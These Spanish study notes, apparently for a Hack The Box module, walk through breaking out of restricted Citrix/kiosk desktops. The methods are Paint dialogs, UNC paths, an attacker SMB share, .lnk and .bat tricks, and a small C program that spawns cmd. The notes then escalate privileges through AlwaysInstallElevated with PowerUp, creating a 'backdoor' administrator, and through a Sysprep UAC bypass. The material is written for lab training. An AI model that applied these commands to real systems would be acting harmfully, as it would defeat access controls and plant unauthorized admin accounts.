
## 1. Metodología

En entornos Citrix, Kiosk o escritorios restringidos, las políticas de grupo (GPO) pueden impedir el acceso a carpetas, CMD, PowerShell y herramientas del sistema.

Metodología general:

1. Conseguir abrir un cuadro de diálogo de Windows.
    
2. Utilizarlo para acceder a rutas restringidas o ejecutar programas.
    
3. Conseguir una consola CMD o PowerShell.
    
4. Enumerar posibles vías de escalada de privilegios.
    
5. Explotar las configuraciones vulnerables encontradas.
    

---

## 2. Omitir restricciones de rutas mediante cuadros de diálogo

Si el Explorador de archivos bloquea el acceso a rutas como `C:\Users`, se puede intentar acceder a ellas desde los cuadros de diálogo **Abrir** o **Guardar como** de aplicaciones como Paint, Notepad o WordPad.

### Procedimiento

1. Abrir Paint desde el menú Inicio.
    
2. Ir a `Archivo > Abrir`.
    
3. En el campo **Nombre de archivo**, introducir una ruta UNC.
    
4. Cambiar el tipo de archivo a `Todos los archivos`.
    

Para acceder a la carpeta del usuario actual:

```
\\127.0.0.1\c$\users\pmorgan
```

Para acceder a sus descargas:

```
\\127.0.0.1\c$\users\pmorgan\Downloads
```

**Concepto clave:** una restricción del Explorador de archivos no implica necesariamente que todas las aplicaciones y sus cuadros de diálogo tengan la misma restricción.

---

## 3. Acceder a un recurso compartido SMB

Podemos utilizar un servidor SMB para transferir herramientas al entorno restringido.

### 3.1. Iniciar el servidor SMB en la máquina atacante

En Linux, desde el directorio que contiene los archivos:

```
smbserver.py -smb2support share "$(pwd)"
```

En el laboratorio, el recurso compartido se llama `share`.

### 3.2. Acceder al recurso compartido desde Citrix

En Paint:

1. Abrir `Archivo > Abrir`.
    
2. Introducir la ruta UNC del servidor SMB en el campo **Nombre de archivo**.
    
3. Seleccionar `Todos los archivos`.
    
4. Pulsar Enter.
    

Ejemplo:

```
\\10.13.38.95\share
```

La IP es la utilizada en el ejemplo del módulo; en otro laboratorio debes sustituirla por la dirección de tu máquina atacante.

### 3.3. Ejecutar un programa desde el recurso SMB

El módulo muestra un ejecutable llamado `pwn.exe` que abre CMD.

Código fuente del ejemplo:

```
#include <stdlib.h>

int main() {
    system("C:\\Windows\\System32\\cmd.exe");
}
```

Al ejecutar el binario desde el cuadro de diálogo, se abre una consola CMD.

**Importante:** ejecutar un programa desde un recurso compartido no garantiza que se puedan copiar archivos ni que se obtengan privilegios elevados. Los permisos y las restricciones del entorno siguen siendo relevantes.

## 4. Utilizar Explorer++

Cuando el Explorador de archivos de Windows tiene restricciones impuestas mediante GPO, una alternativa que contempla el módulo es utilizar un explorador de archivos portátil, como Explorer++.

### Procedimiento

1. Conseguir acceso al recurso SMB mediante el cuadro de diálogo de Paint.
    
2. Localizar `Explorer++.exe`.
    
3. Ejecutarlo.
    
4. Navegar por las carpetas accesibles para el proceso.
    
5. Copiar las herramientas necesarias al escritorio del usuario.
    

Explorer++ no necesita instalación y puede ejecutarse como una aplicación portátil.

**Limitación:** no elimina automáticamente los permisos NTFS ni las restricciones de seguridad. Si el usuario no tiene permiso para acceder a una carpeta, Explorer++ no garantiza el acceso.

## 5. Editores de Registro alternativos

Si el Editor del Registro estándar está bloqueado, el módulo menciona estas alternativas:

- SimpleRegEdit
    
- UberRegedit
    
- SmallRegistryEditor
    

Pueden servir para administrar el Registro cuando la herramienta habitual está restringida por una política de grupo.

Su uso no garantiza que se puedan modificar todas las claves: los permisos de acceso al Registro siguen siendo aplicables.

## 6. Modificar accesos directos existentes (.lnk)

Un acceso directo puede modificarse para ejecutar otro programa.

### Procedimiento

1. Buscar un acceso directo accesible en el escritorio.
    
2. Hacer clic derecho y seleccionar **Propiedades**.
    
3. Revisar el campo **Destino**.
    
4. Modificarlo para apuntar a un ejecutable permitido.
    
5. Ejecutar el acceso directo y comprobar el resultado.
    

En el ejemplo del módulo, se modifica el acceso directo para ejecutar:

```
C:\Windows\System32\cmd.exe
```

Si no existe ningún acceso directo, el módulo propone transferir uno desde un recurso SMB o crear uno mediante PowerShell.

## 7. Ejecutar scripts para obtener CMD

Si el entorno permite ejecutar archivos `.bat`, puede crearse un archivo que invoque CMD.

Contenido de `evil.bat`:

```
cmd
```

Al ejecutarlo, se abre una consola CMD, siempre que las políticas y los permisos del sistema permitan la ejecución.

## 8. Enumerar la escalada de privilegios

Una vez que tenemos acceso a CMD o PowerShell, podemos utilizar herramientas de enumeración como WinPEAS y PowerUp para detectar configuraciones vulnerables.

En este laboratorio, PowerUp detecta que **AlwaysInstallElevated** está habilitado.

### 8.1. Comprobar AlwaysInstallElevated

Consultar la configuración del usuario actual:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Consultar la configuración de la máquina:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

El módulo muestra el siguiente valor en ambas claves:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

Para que esta configuración permita la elevación mediante paquetes MSI, **deben estar habilitadas las dos claves**, tanto la del usuario como la de la máquina.

## 9. Crear un usuario mediante PowerUp

El módulo utiliza la función `Write-UserAddMSI` de PowerUp para generar un instalador MSI que permite crear un usuario.

### Importar PowerUp

```
Import-Module .\PowerUp.ps1
```

### Generar el MSI

```
Write-UserAddMSI
```

El ejemplo genera:

```
UserAdd.msi
```

Al ejecutar el instalador, el laboratorio permite crear un usuario local llamado `backdoor`, asignarle una contraseña y añadirlo al grupo Administradores.

Ejemplo utilizado en el módulo:

```
Usuario: backdoor
Contraseña: T3st@123
Grupo: Administradores
```

La contraseña debe cumplir los requisitos de complejidad configurados en el sistema.

### Abrir CMD como el nuevo usuario

```
runas /user:backdoor cmd
```

Introducir la contraseña cuando se solicite.

**Importante:** pertenecer al grupo Administradores no significa que el proceso se esté ejecutando con un token elevado.

## 10. UAC y elevación del proceso

El Control de Cuentas de Usuario (UAC) puede impedir que una cuenta administrativa acceda a determinados recursos desde un proceso sin elevar.

Por ejemplo, el módulo muestra que intentar acceder a la carpeta del Administrador puede devolver:

```
Access is denied.
```

Para comprobar la identidad y los privilegios del proceso:

```
whoami
```

```
whoami /all
```

```
whoami /priv
```

El módulo presenta un script de bypass de UAC y utiliza el método `UacMethodSysprep`.

Ejemplo mostrado en el laboratorio:

```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

El resultado esperado en el escenario del módulo es abrir una nueva sesión de PowerShell con un nivel de privilegios superior.

El resultado depende de las condiciones del sistema y de que el método funcione en esa versión de Windows.

---

## 11. Leer la flag del Administrador

Una vez obtenido un proceso con los permisos necesarios, consultar el archivo indicado por el laboratorio:

```
type C:\Users\Administrator\Desktop\flag.txt
```

La identidad y los privilegios efectivos deben comprobarse antes de concluir que la escalada ha funcionado.

## 12. Checklist para HTB

- Identificar las restricciones impuestas por GPO.
    
- Intentar abrir un cuadro de diálogo con Paint u otra aplicación.
    
- Probar el acceso a rutas mediante UNC.
    
- Comprobar si es posible acceder a un recurso SMB.
    
- Evaluar si se pueden ejecutar herramientas portátiles como Explorer++.
    
- Revisar accesos directos y ejecución de scripts.
    
- Obtener acceso a CMD o PowerShell.
    
- Ejecutar WinPEAS o PowerUp para enumerar configuraciones vulnerables.
    
- Comprobar `AlwaysInstallElevated` en HKCU y HKLM.
    
- Si ambas claves están habilitadas, evaluar la vía de escalada mediante MSI.
    
- Comprobar la identidad y los privilegios del proceso.
    
- Leer la flag cuando se disponga de los permisos necesarios.

## Ideas clave para el examen

1. Las restricciones de una interfaz gráfica no equivalen necesariamente a permisos NTFS.
    
2. Los cuadros de diálogo de Windows pueden proporcionar acceso a rutas que el Explorador bloquea.
    
3. Las rutas UNC permiten acceder a recursos SMB si la conectividad y los permisos lo permiten.
    
4. Explorer++ es una alternativa portátil, pero no elimina las restricciones de seguridad del sistema.
    
5. `AlwaysInstallElevated` debe estar habilitado tanto en HKCU como en HKLM para que se aplique esta vía de escalada mediante MSI.
    
6. Ser miembro del grupo Administradores no garantiza que el proceso tenga un token elevado debido a UAC.
    
7. Después de conseguir una consola, hay que enumerar el sistema y validar los privilegios efectivos antes de intentar acceder a archivos protegidos.
